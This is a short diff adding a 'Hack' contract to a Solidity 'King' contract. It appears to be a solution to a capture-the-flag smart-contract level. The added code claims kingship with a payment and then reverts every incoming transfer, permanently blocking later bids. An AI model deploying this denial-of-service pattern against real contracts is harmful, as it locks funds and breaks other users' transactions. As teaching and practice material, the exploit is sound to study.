@@ -23,3 +23,17 @@ contract King {
         return king;
     }
 }
+
+contract Hack {
+    King king;
+
+    constructor(address _king) payable {
+        king = King(payable(_king));
+        (bool success, ) = payable(king).call{value: msg.value}("");
+        require(success, "bid failed");
+    }
+
+    fallback() external {
+        revert();
+    }
+}
